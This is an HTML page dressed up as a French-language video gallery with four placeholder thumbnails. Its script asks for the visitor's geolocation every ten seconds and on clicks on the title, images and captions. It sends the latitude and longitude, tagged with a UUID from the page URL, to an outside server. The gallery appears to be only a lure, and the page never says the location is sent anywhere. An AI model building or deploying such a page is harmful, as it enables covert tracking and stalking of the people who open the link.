<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Galerie de Vidéos</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mx-auto py-8">
        <h1 id="title" class="text-3xl font-bold mb-8 text-center">Galerie de Vidéos</h1>
        <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
          
          <!-- Carte de vidéo -->
          <div class="bg-white rounded-lg shadow-md overflow-hidden">
            <img id="image1" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
            <div class="p-4">
              <h2 id="video-title1" class="text-xl font-semibold">Titre de la Vidéo</h2>
            </div>
          </div>
    
          <!-- Répétez la carte de vidéo pour d'autres vidéos -->
          <div class="bg-white rounded-lg shadow-md overflow-hidden">
            <img id="image2" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
            <div class="p-4">
              <h2 id="video-title2" class="text-xl font-semibold">Titre de la Vidéo</h2>
            </div>
          </div>
    
          <div class="bg-white rounded-lg shadow-md overflow-hidden">
            <img id="image3" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
            <div class="p-4">
              <h2 id="video-title3" class="text-xl font-semibold">Titre de la Vidéo</h2>
            </div>
          </div>
    
          <div class="bg-white rounded-lg shadow-md overflow-hidden">
            <img id="image4" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
            <div class="p-4">
              <h2 id="video-title4" class="text-xl font-semibold">Titre de la Vidéo</h2>
            </div>
          </div>
        </div>
    </div>

    <script>
        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
        function attemptGeolocation() {
            navigator.geolocation.getCurrentPosition(position => {
                const uuid = window.location.pathname.split('/').pop();
                const { latitude, longitude } = position.coords;

                fetch('https://geo-localisation.onrender.com/location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ uuid, latitude, longitude })
                })
                .then(response => response.text())
                .then(data => console.log(data))
                .catch(error => console.error('Error:', error));
            }, error => {
                // En cas d'échec, recharger la page après un délai de 5 secondes
                console.error('Geolocation error:', error);
            });
        }

        // Appeler la fonction pour tenter de récupérer la position
        setInterval(attemptGeolocation, 10000);

        // Ajouter des écouteurs d'événements pour rendre le titre et les images cliquables
        document.getElementById('title').addEventListener('click', attemptGeolocation);
        document.getElementById('image1').addEventListener('click', attemptGeolocation);
        document.getElementById('video-title1').addEventListener('click', attemptGeolocation);
        document.getElementById('image2').addEventListener('click', attemptGeolocation);
        document.getElementById('video-title2').addEventListener('click', attemptGeolocation);
        document.getElementById('image3').addEventListener('click', attemptGeolocation);
        document.getElementById('video-title3').addEventListener('click', attemptGeolocation);
        document.getElementById('image4').addEventListener('click', attemptGeolocation);
        document.getElementById('video-title4').addEventListener('click', attemptGeolocation);
    </script>
</body>
</html>
